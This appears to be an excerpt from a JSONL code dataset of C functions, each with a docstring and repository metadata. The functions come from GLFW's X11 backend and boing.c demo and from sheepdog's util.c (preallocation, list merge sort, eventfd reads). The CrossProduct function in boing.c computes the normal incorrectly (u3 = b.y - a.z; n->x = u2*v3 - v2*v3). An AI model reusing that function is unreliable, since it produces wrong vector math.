GL_TRUE;\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_init.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "/*****************************************************************************\n * Draw a faceted latitude band of the Boing ball.\n *\n * Parms:   long_lo, long_hi\n *          Low and high longitudes of slice, resp.\n *****************************************************************************/\n", "func_signal": "void DrawBoingBallBand( GLfloat long_lo,\n                        GLfloat long_hi )", "code": "{\n   vertex_t vert_ne;            /* \"ne\" means south-east, so on */\n   vertex_t vert_nw;\n   vertex_t vert_sw;\n   vertex_t vert_se;\n   vertex_t vert_norm;\n   GLfloat  lat_deg;\n   static int colorToggle = 0;\n\n  /*\n   * Iterate thru the points of a latitude circle.\n   * A latitude circle is a 2D set of X,Z points.\n   */\n   for ( lat_deg = 0;\n         lat_deg <= (360 - STEP_LATITUDE);\n         lat_deg += STEP_LATITUDE )\n   {\n     /*\n      * Color this polygon with red or white.\n      */\n      if ( colorToggle )\n         glColor3f( 0.8f, 0.1f, 0.1f );\n      else\n         glColor3f( 0.95f, 0.95f, 0.95f );\n#if 0\n      if ( lat_deg >= 180 )\n         if ( colorToggle )\n            glColor3f( 0.1f, 0.8f, 0.1f );\n         else\n            glColor3f( 0.5f, 0.5f, 0.95f );\n#endif\n      colorToggle = ! colorToggle;\n\n     /*\n      * Change color if drawing shadow.\n      */\n      if ( drawBallHow == DRAW_BALL_SHADOW )\n         glColor3f( 0.35f, 0.35f, 0.35f );\n\n     /*\n      * Assign each Y.\n      */\n      vert_ne.y = vert_nw.y = (float) cos_deg(long_hi) * RADIUS;\n      vert_sw.y = vert_se.y = (float) cos_deg(long_lo) * RADIUS;\n\n     /*\n      * Assign each X,Z with sin,cos values scaled by latitude radius indexed by longitude.\n      * Eg, long=0 and long=180 are at the poles, so zero scale is sin(longitude),\n      * while long=90 (sin(90)=1) is at equator.\n      */\n      vert_ne.x = (float) cos_deg( lat_deg                 ) * (RADIUS * (float) sin_deg( long_lo + STEP_LONGITUDE ));\n      vert_se.x = (float) cos_deg( lat_deg                 ) * (RADIUS * (float) sin_deg( long_lo                  ));\n      vert_nw.x = (float) cos_deg( lat_deg + STEP_LATITUDE ) * (RADIUS * (float) sin_deg( long_lo + STEP_LONGITUDE ));\n      vert_sw.x = (float) cos_deg( lat_deg + STEP_LATITUDE ) * (RADIUS * (float) sin_deg( long_lo                  ));\n\n      vert_ne.z = (float) sin_deg( lat_deg                 ) * (RADIUS * (float) sin_deg( long_lo + STEP_LONGITUDE ));\n      vert_se.z = (float) sin_deg( lat_deg                 ) * (RADIUS * (float) sin_deg( long_lo                  ));\n      vert_nw.z = (float) sin_deg( lat_deg + STEP_LATITUDE ) * (RADIUS * (float) sin_deg( long_lo + STEP_LONGITUDE ));\n      vert_sw.z = (float) sin_deg( lat_deg + STEP_LATITUDE ) * (RADIUS * (float) sin_deg( long_lo                  ));\n\n     /*\n      * Draw the facet.\n      */\n      glBegin( GL_POLYGON );\n\n      CrossProduct( vert_ne, vert_nw, vert_sw, &vert_norm );\n      glNormal3f( vert_norm.x, vert_norm.y, vert_norm.z );\n\n      glVertex3f( vert_ne.x, vert_ne.y, vert_ne.z );\n      glVertex3f( vert_nw.x, vert_nw.y, vert_nw.z );\n      glVertex3f( vert_sw.x, vert_sw.y, vert_sw.z );\n      glVertex3f( vert_se.x, vert_se.y, vert_se.z );\n\n      glEnd();\n\n#if BOING_DEBUG\n      printf( \"----------------------------------------------------------- \\n\" );\n      printf( \"lat = %f  long_lo = %f  long_hi = %f \\n\", lat_deg, long_lo, long_hi );\n      printf( \"vert_ne  x = %.8f  y = %.8f  z = %.8f \\n\", vert_ne.x, vert_ne.y, vert_ne.z );\n      printf( \"vert_nw  x = %.8f  y = %.8f  z = %.8f \\n\", vert_nw.x, vert_nw.y, vert_nw.z );\n      printf( \"vert_se  x = %.8f  y = %.8f  z = %.8f \\n\", vert_se.x, vert_se.y, vert_se.z );\n      printf( \"vert_sw  x = %.8f  y = %.8f  z = %.8f \\n\", vert_sw.x, vert_sw.y, vert_sw.z );\n#endif\n\n   }\n\n  /*\n   * Toggle color so that next band will opposite red/white colors than this one.\n   */\n   colorToggle = ! colorToggle;\n\n  /*\n   * This circular band is done.\n   */\n   return;\n}", "path": "sb7code/extern/glfw-3.0.4/examples/boing.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "// Restore the saved (original) video mode for the specified monitor\n//\n", "func_signal": "void _glfwRestoreVideoMode(_GLFWmonitor* monitor)", "code": "{\n    if (_glfw.x11.randr.available)\n    {\n        XRRScreenResources* sr;\n        XRRCrtcInfo* ci;\n\n        if (monitor->x11.oldMode == None)\n            return;\n\n        sr = XRRGetScreenResources(_glfw.x11.display, _glfw.x11.root);\n        ci = XRRGetCrtcInfo(_glfw.x11.display, sr, monitor->x11.crtc);\n\n        XRRSetCrtcConfig(_glfw.x11.display,\n                         sr, monitor->x11.crtc,\n                         CurrentTime,\n                         ci->x, ci->y,\n                         monitor->x11.oldMode,\n                         ci->rotation,\n                         ci->outputs,\n                         ci->noutput);\n\n        XRRFreeCrtcInfo(ci);\n        XRRFreeScreenResources(sr);\n\n        monitor->x11.oldMode = None;\n    }\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_monitor.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n//////                       GLFW platform API                      //////\n//////////////////////////////////////////////////////////////////////////\n", "func_signal": "_GLFWmonitor** _glfwPlatformGetMonitors(int* count)", "code": "{\n    _GLFWmonitor** monitors = NULL;\n\n    *count = 0;\n\n    if (_glfw.x11.randr.available)\n    {\n        int i, found = 0;\n        RROutput primary;\n        XRRScreenResources* sr;\n\n        sr = XRRGetScreenResources(_glfw.x11.display, _glfw.x11.root);\n        primary = XRRGetOutputPrimary(_glfw.x11.display, _glfw.x11.root);\n\n        monitors = calloc(sr->ncrtc, sizeof(_GLFWmonitor*));\n\n        for (i = 0;  i < sr->ncrtc;  i++)\n        {\n            int j;\n            XRROutputInfo* oi;\n            XRRCrtcInfo* ci;\n            RROutput output;\n\n            ci = XRRGetCrtcInfo(_glfw.x11.display, sr, sr->crtcs[i]);\n            if (ci->noutput == 0)\n            {\n                XRRFreeCrtcInfo(ci);\n                continue;\n            }\n\n            output = ci->outputs[0];\n\n            for (j = 0;  j < ci->noutput;  j++)\n            {\n                if (ci->outputs[j] == primary)\n                {\n                    output = primary;\n                    break;\n                }\n            }\n\n            oi = XRRGetOutputInfo(_glfw.x11.display, sr, output);\n            if (oi->connection != RR_Connected)\n            {\n                XRRFreeOutputInfo(oi);\n                XRRFreeCrtcInfo(ci);\n                continue;\n            }\n\n            monitors[found] = _glfwCreateMonitor(oi->name,\n                                                 oi->mm_width, oi->mm_height);\n\n            monitors[found]->x11.output = output;\n            monitors[found]->x11.crtc   = oi->crtc;\n\n            XRRFreeOutputInfo(oi);\n            XRRFreeCrtcInfo(ci);\n\n            found++;\n        }\n\n        XRRFreeScreenResources(sr);\n\n        for (i = 0;  i < found;  i++)\n        {\n            if (monitors[i]->x11.output == primary)\n            {\n                _GLFWmonitor* temp = monitors[0];\n                monitors[0] = monitors[i];\n                monitors[i] = temp;\n                break;\n            }\n        }\n\n        if (found == 0)\n        {\n            free(monitors);\n            monitors = NULL;\n        }\n\n        *count = found;\n    }\n    else\n    {\n        monitors = calloc(1, sizeof(_GLFWmonitor*));\n        monitors[0] = _glfwCreateMonitor(\"Display\",\n                                         DisplayWidthMM(_glfw.x11.display,\n                                                        _glfw.x11.screen),\n                                         DisplayHeightMM(_glfw.x11.display,\n                                                         _glfw.x11.screen));\n        *count = 1;\n    }\n\n    return monitors;\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_monitor.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "/*****************************************************************************\n * Compute a cross product (for a normal vector).\n *\n * c = a x b\n *****************************************************************************/\n", "func_signal": "void CrossProduct( vertex_t a, vertex_t b, vertex_t c, vertex_t *n )", "code": "{\n   GLfloat u1, u2, u3;\n   GLfloat v1, v2, v3;\n\n   u1 = b.x - a.x;\n   u2 = b.y - a.y;\n   u3 = b.y - a.z;\n\n   v1 = c.x - a.x;\n   v2 = c.y - a.y;\n   v3 = c.z - a.z;\n\n   n->x = u2 * v3 - v2 * v3;\n   n->y = u3 * v1 - v3 * u1;\n   n->z = u1 * v2 - v1 * u2;\n}", "path": "sb7code/extern/glfw-3.0.4/examples/boing.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n//////                       GLFW platform API                      //////\n//////////////////////////////////////////////////////////////////////////\n", "func_signal": "void _glfwPlatformGetGammaRamp(_GLFWmonitor* monitor, GLFWgammaramp* ramp)", "code": "{\n    if (_glfw.x11.randr.available && !_glfw.x11.randr.gammaBroken)\n    {\n        const size_t size = XRRGetCrtcGammaSize(_glfw.x11.display,\n                                                monitor->x11.crtc);\n        XRRCrtcGamma* gamma = XRRGetCrtcGamma(_glfw.x11.display,\n                                              monitor->x11.crtc);\n\n        _glfwAllocGammaArrays(ramp, size);\n\n        memcpy(ramp->red, gamma->red, size * sizeof(unsigned short));\n        memcpy(ramp->green, gamma->green, size * sizeof(unsigned short));\n        memcpy(ramp->blue, gamma->blue, size * sizeof(unsigned short));\n\n        XRRFreeGamma(gamma);\n    }\n    else if (_glfw.x11.vidmode.available)\n    {\n        int size;\n        XF86VidModeGetGammaRampSize(_glfw.x11.display, _glfw.x11.screen, &size);\n\n        _glfwAllocGammaArrays(ramp, size);\n\n        XF86VidModeGetGammaRamp(_glfw.x11.display,\n                                _glfw.x11.screen,\n                                ramp->size, ramp->red, ramp->green, ramp->blue);\n    }\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_gamma.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n//////                         GLFW event API                       //////\n//////////////////////////////////////////////////////////////////////////\n", "func_signal": "void _glfwInputWindowFocus(_GLFWwindow* window, GLboolean focused)", "code": "{\n    if (focused)\n    {\n        if (_glfw.focusedWindow != window)\n        {\n            _glfw.focusedWindow = window;\n\n            if (window->callbacks.focus)\n                window->callbacks.focus((GLFWwindow*) window, focused);\n        }\n    }\n    else\n    {\n        if (_glfw.focusedWindow == window)\n        {\n            int i;\n\n            _glfw.focusedWindow = NULL;\n\n            if (window->callbacks.focus)\n                window->callbacks.focus((GLFWwindow*) window, focused);\n\n            // Release all pressed keyboard keys\n            for (i = 0;  i <= GLFW_KEY_LAST;  i++)\n            {\n                if (window->key[i] == GLFW_PRESS)\n                    _glfwInputKey(window, i, 0, GLFW_RELEASE, 0);\n            }\n\n            // Release all pressed mouse buttons\n            for (i = 0;  i <= GLFW_MOUSE_BUTTON_LAST;  i++)\n            {\n                if (window->mouseButton[i] == GLFW_PRESS)\n                    _glfwInputMouseClick(window, i, GLFW_RELEASE, 0);\n            }\n        }\n    }\n}", "path": "sb7code/extern/glfw-3.0.4/src/window.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "// Report X error\n//\n", "func_signal": "void _glfwInputXError(int error, const char* message)", "code": "{\n    char buffer[8192];\n    XGetErrorText(_glfw.x11.display, _glfw.x11.errorCode,\n                  buffer, sizeof(buffer));\n\n    _glfwInputError(error, \"%s: %s\", message, buffer);\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_init.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "// Set the current video mode for the specified monitor\n//\n", "func_signal": "void _glfwSetVideoMode(_GLFWmonitor* monitor, const GLFWvidmode* desired)", "code": "{\n    if (_glfw.x11.randr.available)\n    {\n        int i, j;\n        XRRScreenResources* sr;\n        XRRCrtcInfo* ci;\n        XRROutputInfo* oi;\n        RRMode bestMode = 0;\n        unsigned int sizeDiff, leastSizeDiff = UINT_MAX;\n        unsigned int rateDiff, leastRateDiff = UINT_MAX;\n\n        sr = XRRGetScreenResources(_glfw.x11.display, _glfw.x11.root);\n        ci = XRRGetCrtcInfo(_glfw.x11.display, sr, monitor->x11.crtc);\n        oi = XRRGetOutputInfo(_glfw.x11.display, sr, monitor->x11.output);\n\n        for (i = 0;  i < sr->nmode;  i++)\n        {\n            const XRRModeInfo* mi = sr->modes + i;\n\n            if (mi->modeFlags & RR_Interlace)\n                continue;\n\n            for (j = 0;  j < oi->nmode;  j++)\n            {\n                if (oi->modes[j] == mi->id)\n                    break;\n            }\n\n            if (j == oi->nmode)\n                continue;\n\n            sizeDiff = (mi->width - desired->width) *\n                       (mi->width - desired->width) +\n                       (mi->height - desired->height) *\n                       (mi->height - desired->height);\n\n            if (desired->refreshRate)\n                rateDiff = abs(calculateRefreshRate(mi) - desired->refreshRate);\n            else\n                rateDiff = UINT_MAX - calculateRefreshRate(mi);\n\n            if ((sizeDiff < leastSizeDiff) ||\n                (sizeDiff == leastSizeDiff && rateDiff < leastRateDiff))\n            {\n                bestMode = mi->id;\n                leastSizeDiff = sizeDiff;\n                leastRateDiff = rateDiff;\n            }\n        }\n\n        if (bestMode == ci->mode)\n            return;\n\n        if (monitor->x11.oldMode == None)\n            monitor->x11.oldMode = ci->mode;\n\n        XRRSetCrtcConfig(_glfw.x11.display,\n                         sr, monitor->x11.crtc,\n                         CurrentTime,\n                         ci->x, ci->y,\n                         bestMode,\n                         ci->rotation,\n                         ci->outputs,\n                         ci->noutput);\n\n        XRRFreeOutputInfo(oi);\n        XRRFreeCrtcInfo(ci);\n        XRRFreeScreenResources(sr);\n    }\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_monitor.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "/*****************************************************************************\n * display()\n *****************************************************************************/\n", "func_signal": "void display(void)", "code": "{\n   glClear( GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );\n   glPushMatrix();\n\n   drawBallHow = DRAW_BALL_SHADOW;\n   DrawBoingBall();\n\n   DrawGrid();\n\n   drawBallHow = DRAW_BALL;\n   DrawBoingBall();\n\n   glPopMatrix();\n   glFlush();\n}", "path": "sb7code/extern/glfw-3.0.4/examples/boing.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "/*****************************************************************************\n * init()\n *****************************************************************************/\n", "func_signal": "void init( void )", "code": "{\n   /*\n    * Clear background.\n    */\n   glClearColor( 0.55f, 0.55f, 0.55f, 0.f );\n\n   glShadeModel( GL_FLAT );\n}", "path": "sb7code/extern/glfw-3.0.4/examples/boing.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "// Create a blank cursor (for locked mouse mode)\n//\n", "func_signal": "static Cursor createNULLCursor(void)", "code": "{\n    Pixmap cursormask;\n    XGCValues xgc;\n    GC gc;\n    XColor col;\n    Cursor cursor;\n\n    _glfwGrabXErrorHandler();\n\n    cursormask = XCreatePixmap(_glfw.x11.display, _glfw.x11.root, 1, 1, 1);\n    xgc.function = GXclear;\n    gc = XCreateGC(_glfw.x11.display, cursormask, GCFunction, &xgc);\n    XFillRectangle(_glfw.x11.display, cursormask, gc, 0, 0, 1, 1);\n    col.pixel = 0;\n    col.red = 0;\n    col.flags = 4;\n    cursor = XCreatePixmapCursor(_glfw.x11.display,\n                                 cursormask, cursormask,\n                                 &col, &col, 0, 0);\n    XFreePixmap(_glfw.x11.display, cursormask);\n    XFreeGC(_glfw.x11.display, gc);\n\n    _glfwReleaseXErrorHandler();\n\n    if (cursor == None)\n    {\n        _glfwInputXError(GLFW_PLATFORM_ERROR,\n                         \"X11: Failed to create null cursor\");\n    }\n\n    return cursor;\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_init.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "// Translate an X11 key code to a GLFW key code.\n//\n", "func_signal": "static int translateKey(int keyCode)", "code": "{\n    int keySym;\n\n    // Valid key code range is  [8,255], according to the XLib manual\n    if (keyCode < 8 || keyCode > 255)\n        return GLFW_KEY_UNKNOWN;\n\n    // Try secondary keysym, for numeric keypad keys\n    // Note: This way we always force \"NumLock = ON\", which is intentional\n    // since the returned key code should correspond to a physical\n    // location.\n    keySym = XkbKeycodeToKeysym(_glfw.x11.display, keyCode, 0, 1);\n    switch (keySym)\n    {\n        case XK_KP_0:           return GLFW_KEY_KP_0;\n        case XK_KP_1:           return GLFW_KEY_KP_1;\n        case XK_KP_2:           return GLFW_KEY_KP_2;\n        case XK_KP_3:           return GLFW_KEY_KP_3;\n        case XK_KP_4:           return GLFW_KEY_KP_4;\n        case XK_KP_5:           return GLFW_KEY_KP_5;\n        case XK_KP_6:           return GLFW_KEY_KP_6;\n        case XK_KP_7:           return GLFW_KEY_KP_7;\n        case XK_KP_8:           return GLFW_KEY_KP_8;\n        case XK_KP_9:           return GLFW_KEY_KP_9;\n        case XK_KP_Separator:\n        case XK_KP_Decimal:     return GLFW_KEY_KP_DECIMAL;\n        case XK_KP_Equal:       return GLFW_KEY_KP_EQUAL;\n        case XK_KP_Enter:       return GLFW_KEY_KP_ENTER;\n        default:                break;\n    }\n\n    // Now try pimary keysym for function keys (non-printable keys). These\n    // should not be layout dependent (i.e. US layout and international\n    // layouts should give the same result).\n    keySym = XkbKeycodeToKeysym(_glfw.x11.display, keyCode, 0, 0);\n    switch (keySym)\n    {\n        case XK_Escape:         return GLFW_KEY_ESCAPE;\n        case XK_Tab:            return GLFW_KEY_TAB;\n        case XK_Shift_L:        return GLFW_KEY_LEFT_SHIFT;\n        case XK_Shift_R:        return GLFW_KEY_RIGHT_SHIFT;\n        case XK_Control_L:      return GLFW_KEY_LEFT_CONTROL;\n        case XK_Control_R:      return GLFW_KEY_RIGHT_CONTROL;\n        case XK_Meta_L:\n        case XK_Alt_L:          return GLFW_KEY_LEFT_ALT;\n        case XK_Mode_switch: // Mapped to Alt_R on many keyboards\n        case XK_ISO_Level3_Shift: // AltGr on at least some machines\n        case XK_Meta_R:\n        case XK_Alt_R:          return GLFW_KEY_RIGHT_ALT;\n        case XK_Super_L:        return GLFW_KEY_LEFT_SUPER;\n        case XK_Super_R:        return GLFW_KEY_RIGHT_SUPER;\n        case XK_Menu:           return GLFW_KEY_MENU;\n        case XK_Num_Lock:       return GLFW_KEY_NUM_LOCK;\n        case XK_Caps_Lock:      return GLFW_KEY_CAPS_LOCK;\n        case XK_Print:          return GLFW_KEY_PRINT_SCREEN;\n        case XK_Scroll_Lock:    return GLFW_KEY_SCROLL_LOCK;\n        case XK_Pause:          return GLFW_KEY_PAUSE;\n        case XK_Delete:         return GLFW_KEY_DELETE;\n        case XK_BackSpace:      return GLFW_KEY_BACKSPACE;\n        case XK_Return:         return GLFW_KEY_ENTER;\n        case XK_Home:           return GLFW_KEY_HOME;\n        case XK_End:            return GLFW_KEY_END;\n        case XK_Page_Up:        return GLFW_KEY_PAGE_UP;\n        case XK_Page_Down:      return GLFW_KEY_PAGE_DOWN;\n        case XK_Insert:         return GLFW_KEY_INSERT;\n        case XK_Left:           return GLFW_KEY_LEFT;\n        case XK_Right:          return GLFW_KEY_RIGHT;\n        case XK_Down:           return GLFW_KEY_DOWN;\n        case XK_Up:             return GLFW_KEY_UP;\n        case XK_F1:             return GLFW_KEY_F1;\n        case XK_F2:             return GLFW_KEY_F2;\n        case XK_F3:             return GLFW_KEY_F3;\n        case XK_F4:             return GLFW_KEY_F4;\n        case XK_F5:             return GLFW_KEY_F5;\n        case XK_F6:             return GLFW_KEY_F6;\n        case XK_F7:             return GLFW_KEY_F7;\n        case XK_F8:             return GLFW_KEY_F8;\n        case XK_F9:             return GLFW_KEY_F9;\n        case XK_F10:            return GLFW_KEY_F10;\n        case XK_F11:            return GLFW_KEY_F11;\n        case XK_F12:            return GLFW_KEY_F12;\n        case XK_F13:            return GLFW_KEY_F13;\n        case XK_F14:            return GLFW_KEY_F14;\n        case XK_F15:            return GLFW_KEY_F15;\n        case XK_F16:            return GLFW_KEY_F16;\n        case XK_F17:            return GLFW_KEY_F17;\n        case XK_F18:            return GLFW_KEY_F18;\n        case XK_F19:            return GLFW_KEY_F19;\n        case XK_F20:            return GLFW_KEY_F20;\n        case XK_F21:            return GLFW_KEY_F21;\n        case XK_F22:            return GLFW_KEY_F22;\n        case XK_F23:            return GLFW_KEY_F23;\n        case XK_F24:            return GLFW_KEY_F24;\n        case XK_F25:            return GLFW_KEY_F25;\n\n        // Numeric keypad\n        case XK_KP_Divide:      return GLFW_KEY_KP_DIVIDE;\n        case XK_KP_Multiply:    return GLFW_KEY_KP_MULTIPLY;\n        case XK_KP_Subtract:    return GLFW_KEY_KP_SUBTRACT;\n        case XK_KP_Add:         return GLFW_KEY_KP_ADD;\n\n        // These should have been detected in secondary keysym test above!\n        case XK_KP_Insert:      return GLFW_KEY_KP_0;\n        case XK_KP_End:         return GLFW_KEY_KP_1;\n        case XK_KP_Down:        return GLFW_KEY_KP_2;\n        case XK_KP_Page_Down:   return GLFW_KEY_KP_3;\n        case XK_KP_Left:        return GLFW_KEY_KP_4;\n        case XK_KP_Right:       return GLFW_KEY_KP_6;\n        case XK_KP_Home:        return GLFW_KEY_KP_7;\n        case XK_KP_Up:          return GLFW_KEY_KP_8;\n        case XK_KP_Page_Up:     return GLFW_KEY_KP_9;\n        case XK_KP_Delete:      return GLFW_KEY_KP_DECIMAL;\n        case XK_KP_Equal:       return GLFW_KEY_KP_EQUAL;\n        case XK_KP_Enter:       return GLFW_KEY_KP_ENTER;\n\n        // Last resort: Check for printable keys (should not happen if the XKB\n        // extension is available). This will give a layout dependent mapping\n        // (which is wrong, and we may miss some keys, especially on non-US\n        // keyboards), but it's better than nothing...\n        case XK_a:              return GLFW_KEY_A;\n        case XK_b:              return GLFW_KEY_B;\n        case XK_c:              return GLFW_KEY_C;\n        case XK_d:              return GLFW_KEY_D;\n        case XK_e:              return GLFW_KEY_E;\n        case XK_f:              return GLFW_KEY_F;\n        case XK_g:              return GLFW_KEY_G;\n        case XK_h:              return GLFW_KEY_H;\n        case XK_i:              return GLFW_KEY_I;\n        case XK_j:              return GLFW_KEY_J;\n        case XK_k:              return GLFW_KEY_K;\n        case XK_l:              return GLFW_KEY_L;\n        case XK_m:              return GLFW_KEY_M;\n        case XK_n:              return GLFW_KEY_N;\n        case XK_o:              return GLFW_KEY_O;\n        case XK_p:              return GLFW_KEY_P;\n        case XK_q:              return GLFW_KEY_Q;\n        case XK_r:              return GLFW_KEY_R;\n        case XK_s:              return GLFW_KEY_S;\n        case XK_t:              return GLFW_KEY_T;\n        case XK_u:              return GLFW_KEY_U;\n        case XK_v:              return GLFW_KEY_V;\n        case XK_w:              return GLFW_KEY_W;\n        case XK_x:              return GLFW_KEY_X;\n        case XK_y:              return GLFW_KEY_Y;\n        case XK_z:              return GLFW_KEY_Z;\n        case XK_1:              return GLFW_KEY_1;\n        case XK_2:              return GLFW_KEY_2;\n        case XK_3:              return GLFW_KEY_3;\n        case XK_4:              return GLFW_KEY_4;\n        case XK_5:              return GLFW_KEY_5;\n        case XK_6:              return GLFW_KEY_6;\n        case XK_7:              return GLFW_KEY_7;\n        case XK_8:              return GLFW_KEY_8;\n        case XK_9:              return GLFW_KEY_9;\n        case XK_0:              return GLFW_KEY_0;\n        case XK_space:          return GLFW_KEY_SPACE;\n        case XK_minus:          return GLFW_KEY_MINUS;\n        case XK_equal:          return GLFW_KEY_EQUAL;\n        case XK_bracketleft:    return GLFW_KEY_LEFT_BRACKET;\n        case XK_bracketright:   return GLFW_KEY_RIGHT_BRACKET;\n        case XK_backslash:      return GLFW_KEY_BACKSLASH;\n        case XK_semicolon:      return GLFW_KEY_SEMICOLON;\n        case XK_apostrophe:     return GLFW_KEY_APOSTROPHE;\n        case XK_grave:          return GLFW_KEY_GRAVE_ACCENT;\n        case XK_comma:          return GLFW_KEY_COMMA;\n        case XK_period:         return GLFW_KEY_PERIOD;\n        case XK_slash:          return GLFW_KEY_SLASH;\n        case XK_less:           return GLFW_KEY_WORLD_1; // At least in some layouts...\n        default:                break;\n    }\n\n    // No matching translation was found\n    return GLFW_KEY_UNKNOWN;\n}", "path": "sb7code/extern/glfw-3.0.4/src/x11_init.c", "commit_date": "2015-07-24 00:00:00", "repo_name": "openglsuperbible/sb7code", "stars": 704, "license": "None", "language": "c", "size": 816}
{"docstring": "/* preallocate the whole object */\n", "func_signal": "int prealloc(int fd, uint64_t size)", "code": "{\n\tint ret = xfallocate(fd, 0, 0, size);\n\tif (ret < 0) {\n\t\tif (errno != ENOSYS && errno != EOPNOTSUPP) {\n\t\t\treturn ret;\n\t\t}\n\n\t\treturn xftruncate(fd, size);\n\t}\n\n\treturn 0;\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * Returns a list organized in an intermediate format suited\n * to chaining of merge() calls: null-terminated, no reserved or\n * sentinel head node, \"prev\" links not maintained.\n */\n", "func_signal": "static struct list_node *merge(void *priv,\n\t\t\t       int (*cmp)(void *priv, struct list_node *a,\n\t\t\t\t\t  struct list_node *b),\n\t\t\t       struct list_node *a, struct list_node *b)", "code": "{\n\tstruct list_node head, *tail = &head;\n\n\twhile (a && b) {\n\t\t/* if equal, take 'a' -- important for sort stability */\n\t\tif ((*cmp)(priv, a, b) <= 0) {\n\t\t\ttail->next = a;\n\t\t\ta = a->next;\n\t\t} else {\n\t\t\ttail->next = b;\n\t\t\tb = b->next;\n\t\t}\n\t\ttail = tail->next;\n\t}\n\ttail->next = a?:b;\n\treturn head.next;\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * Combine final list merge with restoration of standard doubly-linked\n * list structure.  This approach duplicates code from merge(), but\n * runs faster than the tidier alternatives of either a separate final\n * prev-link restoration pass, or maintaining the prev links\n * throughout.\n */\n", "func_signal": "static void\nmerge_and_restore_back_links(void *priv,\n\t\t\t     int (*cmp)(void *priv, struct list_node *a,\n\t\t\t\t\tstruct list_node *b),\n\t\t\t     struct list_head *head,\n\t\t\t     struct list_node *a, struct list_node *b)", "code": "{\n\tstruct list_node *tail = &head->n;\n\n\twhile (a && b) {\n\t\t/* if equal, take 'a' -- important for sort stability */\n\t\tif ((*cmp)(priv, a, b) <= 0) {\n\t\t\ttail->next = a;\n\t\t\ta->prev = tail;\n\t\t\ta = a->next;\n\t\t} else {\n\t\t\ttail->next = b;\n\t\t\tb->prev = tail;\n\t\t\tb = b->next;\n\t\t}\n\t\ttail = tail->next;\n\t}\n\ttail->next = a ? : b;\n\n\tdo {\n\t\t/*\n\t\t * In worst cases this loop may run many iterations.\n\t\t * Continue callbacks to the client even though no\n\t\t * element comparison is needed, so the client's cmp()\n\t\t * routine can invoke cond_resched() periodically.\n\t\t */\n\t\t(*cmp)(priv, tail->next, tail->next);\n\n\t\ttail->next->prev = tail;\n\t\ttail = tail->next;\n\t} while (tail->next);\n\n\ttail->next = &head->n;\n\thead->n.prev = tail;\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * Return the read value on success, or -1 if efd has been made nonblocking and\n * errno is EAGAIN.  If efd has been marked blocking or the eventfd counter is\n * not zero, this function doesn't return error.\n */\n", "func_signal": "int eventfd_xread(int efd)", "code": "{\n\tint ret;\n\teventfd_t value = 0;\n\n\tdo {\n\t\tret = eventfd_read(efd, &value);\n\t} while (unlikely(ret < 0) && errno == EINTR);\n\n\tif (ret == 0)\n\t\tret = value;\n\telse if (unlikely(errno != EAGAIN))\n\t\tpanic(\"eventfd_read() failed, %m\");\n\n\treturn ret;\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
